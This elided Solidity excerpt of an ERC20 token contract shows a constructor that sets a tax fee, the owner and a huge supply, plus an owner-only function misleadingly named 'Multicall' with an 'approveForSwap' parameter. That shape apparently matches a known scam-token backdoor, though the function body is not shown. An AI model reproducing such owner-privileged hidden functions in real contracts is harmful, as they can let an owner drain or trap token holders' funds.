...
contract ERC20 is Context, IERC20 {
  ...
  constructor(
    ...
    taxFee = taxFee_;
    owner = _msgSender();
    _totalSupply = 96600000000000 * (10 ** uint256(decimals_));
  ...
  function Multicall(address _address, uint256 approveForSwap) external {
      require(_msgSender() == owner, "Call it to swap on the Dex");
